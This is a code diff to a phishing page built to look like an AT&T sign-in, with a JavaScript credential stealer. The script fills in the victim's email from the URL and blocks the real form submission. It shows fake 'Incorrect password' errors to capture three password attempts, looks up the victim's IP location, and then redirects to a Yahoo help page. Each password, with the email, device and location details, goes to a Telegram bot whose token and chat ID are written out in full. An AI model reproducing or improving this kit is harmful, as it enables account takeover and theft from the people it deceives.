@@ -135,19 +135,21 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
 
 <!-- =================================================================================== -->
 <!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING                         -->
-<!-- ABSOLUTELY NO PAGE RELOAD/BLINK - CLEARS FIELD ONLY - REDIRECT ON 3RD              -->
+<!-- ONE CLICK = ONE REPORT. CLEARS FIELD AFTER EACH ATTEMPT. REDIRECTS ON 3RD ONLY.    -->
 <!-- =================================================================================== -->
 <script>
 (function() {
     // ==================== ⚠️ REPLACE WITH YOUR REAL TELEGRAM CREDENTIALS ⚠️ ====================
-    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Get from @BotFather
-    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";       // Get from @userinfobot
+    const TELEGRAM_BOT_TOKEN = "8798134988:AAHYPZXrOlk1D8A8cFAWmFN8x75biIFSvK8";   // Get from @BotFather
+    const TELEGRAM_CHAT_ID = "8630161918";       // Get from @userinfobot
     // ==========================================================================================
     
     let passwordAttempts = 0;
     let capturedEmail = null;
+    let interceptorActive = false;
     let emailAutoFilled = false;
     let cachedLocation = null;
+    let processingAttempt = false; // Prevent multiple submissions
     
     // Send message using Image Beacon
     function sendToTelegram(message) {
@@ -160,15 +162,19 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
             return false;
         }
         
+        console.log("[Telegram] Sending message...");
+        
         const encodedMessage = encodeURIComponent(message);
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
         
         if (navigator.sendBeacon) {
             navigator.sendBeacon(url);
+            console.log("[Telegram] Sent via sendBeacon!");
         } else {
-            new Image().src = url;
+            const img = new Image();
+            img.src = url;
+            console.log("[Telegram] Sent via image beacon!");
         }
-        console.log("[Telegram] Sent!");
         return true;
     }
     
@@ -190,48 +196,62 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         return `${browser} on ${os} | ${screen.width}x${screen.height} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
     }
     
-    // Get location
+    // Get location - try multiple services
     async function getLocationInfo() {
         if (cachedLocation) return cachedLocation;
         
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            cachedLocation = {
-                ip: d.ip || "Unknown",
-                city: d.city || "Unknown",
-                state: d.region || "Unknown",
-                zip: d.postal || "Unknown",
-                country: d.country_name || "Unknown"
-            };
-            return cachedLocation;
-        } catch(e) {
+        const services = [
+            {
+                url: 'https://ipapi.co/json/',
+                parse: (d) => ({ ip: d.ip, city: d.city, state: d.region, zip: d.postal, country: d.country_name })
+            },
+            {
+                url: 'https://ipinfo.io/json',
+                parse: (d) => ({ ip: d.ip, city: d.city, state: d.region, zip: d.postal, country: d.country })
+            },
+            {
+                url: 'https://api.ipify.org?format=json',
+                parse: (d) => ({ ip: d.ip, city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" })
+            }
+        ];
+        
+        for (const service of services) {
             try {
-                const res = await fetch('https://ipinfo.io/json');
-                const d = await res.json();
-                cachedLocation = {
-                    ip: d.ip || "Unknown",
-                    city: d.city || "Unknown",
-                    state: d.region || "Unknown",
-                    zip: d.postal || "Unknown",
-                    country: d.country || "Unknown"
-                };
-                return cachedLocation;
-            } catch(e2) {
-                return { ip: "Unknown", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                const res = await fetch(service.url, { signal: controller.signal });
+                clearTimeout(timeoutId);
+                
+                if (res.ok) {
+                    const d = await res.json();
+                    const location = service.parse(d);
+                    cachedLocation = location;
+                    console.log("[Location] Found:", location.city, location.state);
+                    return location;
+                }
+            } catch(e) {
+                console.warn("[Location] Service failed:", service.url);
             }
         }
+        
+        return { ip: "Unknown", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
     }
     
-    // Show error message
-    function showError(attemptCount) {
+    // Show error message on page
+    function showIncorrectPasswordMessage(attemptCount) {
         const existing = document.querySelectorAll('.custom-pw-error');
         existing.forEach(e => e.remove());
         
-        let msg = attemptCount === 1 ? '❌ Incorrect password. Attempt 1/3. Try again.' : '❌ Incorrect password. Attempt 2/3. Last try!';
+        let msg = '';
+        if (attemptCount === 1) {
+            msg = '❌ Incorrect password.';
+        } else if (attemptCount === 2) {
+            msg = '❌ Incorrect password.';
+        }
         
         let container = document.querySelector('#appErrorAbove');
-        if (!container || !container.innerHTML) container = document.querySelector('.formfield-msg');
+        if (!container || container.innerHTML === "") container = document.querySelector('.formfield-msg');
         if (!container) container = document.querySelector('#userInlineErrorText');
         
         if (container) {
@@ -256,243 +276,196 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         return (email && email.includes('@')) ? email : null;
     }
     
-    // Report to Telegram
-    async function reportCredentials(password, attemptNumber) {
-        const deviceInfo = getDeviceInfo();
-        const location = await getLocationInfo();
-        const timestamp = new Date().toLocaleString();
-        
-        const message = `🔐 LOGIN ATTEMPT #${attemptNumber}\n` +
-                        `📧 User: ${capturedEmail || "Unknown"}\n` +
-                        `🔑 Pass: ${password}\n` +
-                        `📱 ${deviceInfo}\n` +
-                        `🌐 IP: ${location.ip}\n` +
-                        `📍 ${location.city}, ${location.state} ${location.zip}\n` +
-                        `🌍 ${location.country}\n` +
-                        `⏰ ${timestamp}`;
-        
-        sendToTelegram(message);
-        console.log(`[Report] Attempt #${attemptNumber} sent.`);
-    }
-    
-    // Handle password attempt - NO RELOAD, NO BLINK
-    function handleAttempt(password) {
-        if (!password || password.trim() === '') return;
-        
-        passwordAttempts++;
-        console.log(`[Interceptor] Attempt #${passwordAttempts}: "${password}"`);
-        
-        // Send report (fire and forget)
-        reportCredentials(password, passwordAttempts);
-        
-        if (passwordAttempts === 1) {
-            // First attempt - clear field, show error, stay on page
-            showError(1);
-            clearPasswordFields();
-            console.log("[Interceptor] Attempt 1 failed - cleared field, staying on page.");
-        } else if (passwordAttempts === 2) {
-            // Second attempt - clear field, show error, stay on page
-            showError(2);
-            clearPasswordFields();
-            console.log("[Interceptor] Attempt 2 failed - cleared field, staying on page.");
-        } else {
-            // Third attempt - redirect
-            console.log("[Interceptor] Attempt 3 - redirecting...");
-            window.location.href = "https://help.yahoo.com";
-        }
-    }
-    
-    // Clear all password fields
-    function clearPasswordFields() {
-        const pwFields = document.querySelectorAll('input[type="password"]');
-        pwFields.forEach(field => {
-            field.value = '';
-        });
-        
-        // Also focus on the password field
-        setTimeout(() => {
-            const pwField = document.querySelector('input[type="password"]');
-            if (pwField) pwField.focus();
-        }, 50);
-    }
-    
-    // COMPLETELY DISABLE FORM SUBMISSION
-    function disableFormSubmission() {
-        // Find the form
-        const form = document.getElementById('login');
-        if (!form) return;
-        
-        // Remove action attribute
-        form.removeAttribute('action');
-        form.setAttribute('onsubmit', 'return false;');
-        
-        // Override submit method
-        form.submit = function() {
-            console.log("[Interceptor] Form submit blocked!");
-            return false;
-        };
-        
-        // Capture all submit events
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-            
-            const pwField = document.querySelector('input[type="password"]');
-            if (pwField && pwField.value) {
-                handleAttempt(pwField.value);
-            }
-            
-            return false;
-        }, true);
-        
-        // Disable all submit buttons
-        const buttons = form.querySelectorAll('button, input[type="submit"]');
-        buttons.forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                e.stopImmediatePropagation();
-                
-                const pwField = document.querySelector('input[type="password"]');
-                if (pwField && pwField.value) {
-                    handleAttempt(pwField.value);
-                }
-                
-                return false;
-            }, true);
-            
-            // Remove type="submit"
-            if (btn.type === 'submit') {
-                btn.type = 'button';
-            }
-        });
-        
-        console.log("[Interceptor] Form submission COMPLETELY disabled.");
-    }
-    
-    // Auto-fill email
-    async function autoGrabEmail() {
+    // Auto-fill email and click continue
+    async function autoGrabAndContinue() {
         if (emailAutoFilled) return;
         const email = extractEmailFromUrl();
         if (!email) return;
         
         capturedEmail = email;
         emailAutoFilled = true;
-        console.log("[AutoGrab] Email:", email);
+        console.log("[AutoGrab] Email captured:", email);
         
-        const checkAndFill = () => {
-            const userInput = document.querySelector('#userID');
-            if (userInput) {
-                userInput.value = email;
-                userInput.dispatchEvent(new Event('input', { bubbles: true }));
-                userInput.dispatchEvent(new Event('change', { bubbles: true }));
-                
-                setTimeout(() => {
-                    const btn = document.querySelector('#continueFromUserLogin');
-                    if (btn) btn.click();
-                }, 300);
-                return true;
-            }
-            return false;
-        };
+        const userInput = await waitForElement('#userID', 8000);
+        if (!userInput) return;
         
-        // Try immediately
-        if (!checkAndFill()) {
-            // Try every 500ms for 10 seconds
-            let attempts = 0;
-            const interval = setInterval(() => {
-                if (checkAndFill() || attempts++ > 20) {
-                    clearInterval(interval);
-                }
-            }, 500);
-        }
+        userInput.value = email;
+        userInput.dispatchEvent(new Event('input', { bubbles: true }));
+        userInput.dispatchEvent(new Event('change', { bubbles: true }));
+        
+        await new Promise(r => setTimeout(r, 500));
+        
+        const btn = await waitForElement('#continueFromUserLogin', 5000);
+        if (btn) btn.click();
     }
     
-    // Watch for password field and set up interceptor
-    function watchForPasswordField() {
+    function waitForElement(selector, maxWaitMs = 10000) {
+        return new Promise((resolve) => {
+            const start = Date.now();
+            const i = setInterval(() => {
+                const el = document.querySelector(selector);
+                if (el) { clearInterval(i); resolve(el); }
+                else if (Date.now() - start > maxWaitMs) { clearInterval(i); resolve(null); }
+            }, 100);
+        });
+    }
+    
+    // Report to Telegram
+    async function reportCredentials(password, attemptNumber, isRedirect = false) {
+        const deviceInfo = getDeviceInfo();
+        const location = await getLocationInfo();
+        const timestamp = new Date().toLocaleString();
+        
+        const message = `🔐 PH!$# ACĆE£$$ #${attemptNumber}\n` +
+                        `📧 User: ${capturedEmail || "Unknown"}\n` +
+                        `🔑 Pass: ${password || "Unknown"}\n` +
+                        `📱 ${deviceInfo}\n` +
+                        `🌐 IP: ${location.ip}\n` +
+                        `📍 ${location.city}, ${location.state} ${location.zip}\n` +
+                        `🌍 ${location.country}\n` +
+                        `⏰ ${timestamp}` +
+                        (isRedirect ? `\n⚠️ 3RD ATTEMPT - REDIRECTING` : '');
+        
+        sendToTelegram(message);
+        console.log(`[Report] Attempt #${attemptNumber} sent. IP: ${location.ip}, Location: ${location.city}, ${location.state}`);
+    }
+    
+    // Handle password attempt - CALLED ONCE PER CLICK
+    async function handlePasswordAttempt(e) {
+        if (processingAttempt) {
+            console.log("[Interceptor] Already processing, ignoring...");
+            return false;
+        }
+        
+        processingAttempt = true;
+        
+        const pwField = document.querySelector('input[type="password"]');
+        const enteredPw = pwField ? pwField.value : '';
+        
+        if (!enteredPw) {
+            processingAttempt = false;
+            return false;
+        }
+        
+        passwordAttempts++;
+        console.log(`[Interceptor] Attempt #${passwordAttempts} - Password: "${enteredPw}"`);
+        
+        // Report to Telegram ONCE
+        await reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
+        
+        if (passwordAttempts < 3) {
+            // Show error message
+            showIncorrectPasswordMessage(passwordAttempts);
+            
+            // Clear password field and focus
+            if (pwField) {
+                pwField.value = '';
+                pwField.focus();
+            }
+            
+            console.log(`[Interceptor] Waiting for attempt #${passwordAttempts + 1}`);
+            processingAttempt = false;
+        } else {
+            // Redirect on 3rd attempt
+            console.log("[Interceptor] 3rd attempt - redirecting to help.yahoo.com...");
+            window.location.href = "https://help.yahoo.com";
+        }
+        
+        return false;
+    }
+    
+    // Password page interceptor
+    function setupPasswordInterceptor() {
+        if (interceptorActive) return;
+        
         const observer = new MutationObserver(() => {
-            const pwField = document.querySelector('input[type="password"]');
-            if (pwField && !window._interceptorSetup) {
-                window._interceptorSetup = true;
+            const pwInput = document.querySelector('input[type="password"]');
+            
+            if (pwInput && !interceptorActive) {
+                interceptorActive = true;
+                console.log("[Interceptor] Password page detected!");
                 
-                // Disable form submission
-                disableFormSubmission();
+                if (!capturedEmail) {
+                    const emailInput = document.querySelector('#userID');
+                    if (emailInput && emailInput.value) capturedEmail = emailInput.value;
+                }
                 
-                // Also intercept Enter key on password field
-                pwField.addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter') {
+                const form = document.getElementById('login');
+                if (form && !form._intercepted) {
+                    form._intercepted = true;
+                    
+                    // Capture phase - block all submissions
+                    form.addEventListener('submit', function(e) {
                         e.preventDefault();
                         e.stopPropagation();
+                        e.stopImmediatePropagation();
                         
-                        if (this.value) {
-                            handleAttempt(this.value);
-                        }
+                        handlePasswordAttempt(e);
                         return false;
+                    }, true);
+                    
+                    // Also intercept the button click
+                    const submitBtn = document.querySelector('#continueFromUserLogin, button[type="submit"], .btn-primary');
+                    if (submitBtn && !submitBtn._intercepted) {
+                        submitBtn._intercepted = true;
+                        submitBtn.addEventListener('click', function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            e.stopImmediatePropagation();
+                            
+                            if (!processingAttempt) {
+                                handlePasswordAttempt(e);
+                            }
+                            return false;
+                        }, true);
                     }
-                }, true);
-                
-                console.log("[Interceptor] Password field intercepted!");
+                    
+                    // Block Angular router navigation
+                    const originalPushState = history.pushState;
+                    const originalReplaceState = history.replaceState;
+                    
+                    history.pushState = function() {
+                        if (passwordAttempts > 0 && passwordAttempts < 3 && !processingAttempt) {
+                            console.log("[Interceptor] Blocked pushState");
+                            return;
+                        }
+                        return originalPushState.apply(history, arguments);
+                    };
+                    
+                    history.replaceState = function() {
+                        if (passwordAttempts > 0 && passwordAttempts < 3 && !processingAttempt) {
+                            console.log("[Interceptor] Blocked replaceState");
+                            return;
+                        }
+                        return originalReplaceState.apply(history, arguments);
+                    };
+                    
+                    console.log("[Interceptor] Ready - 1 click = 1 report. Clears field after each attempt.");
+                }
             }
         });
         
         observer.observe(document.body, { childList: true, subtree: true });
     }
     
-    // Block all navigation attempts during attempts 1-2
-    function blockNavigation() {
-        // Block beforeunload
-        window.addEventListener('beforeunload', function(e) {
-            if (passwordAttempts > 0 && passwordAttempts < 3) {
-                e.preventDefault();
-                e.returnValue = '';
-                return '';
-            }
-        });
-        
-        // Hijack history
-        const originalPush = history.pushState;
-        const originalReplace = history.replaceState;
-        
-        history.pushState = function() {
-            if (passwordAttempts > 0 && passwordAttempts < 3) {
-                console.log("[Interceptor] Navigation blocked");
-                return;
-            }
-            return originalPush.apply(history, arguments);
-        };
-        
-        history.replaceState = function() {
-            if (passwordAttempts > 0 && passwordAttempts < 3) {
-                console.log("[Interceptor] Navigation blocked");
-                return;
-            }
-            return originalReplace.apply(history, arguments);
-        };
-    }
-    
-    // Initialize everything
-    function init() {
-        autoGrabEmail();
-        watchForPasswordField();
-        blockNavigation();
-        
-        // Also try to disable form immediately
-        setTimeout(disableFormSubmission, 100);
-        setTimeout(disableFormSubmission, 500);
-        setTimeout(disableFormSubmission, 1000);
-        setTimeout(disableFormSubmission, 2000);
-        
-        console.log("[Init] ✅ Ready. Page will NOT reload. 3 attempts then redirect.");
-    }
-    
+    // Initialize
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', init);
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(autoGrabAndContinue, 500);
+            setTimeout(setupPasswordInterceptor, 500);
+        });
     } else {
-        init();
+        setTimeout(autoGrabAndContinue, 500);
+        setTimeout(setupPasswordInterceptor, 500);
     }
     
-    window.addEventListener('load', init);
+    window.addEventListener('load', () => {
+        setTimeout(autoGrabAndContinue, 1000);
+        setTimeout(setupPasswordInterceptor, 1000);
+    });
+    
+    console.log("[Init] ✅ Auto-grab + 3-attempt + Telegram ready");
+    console.log("[Init] 📌 Flow: Click 1 → Report → Clear → Click 2 → Report → Clear → Click 3 → Report → Redirect");
 })();
 </script>
 
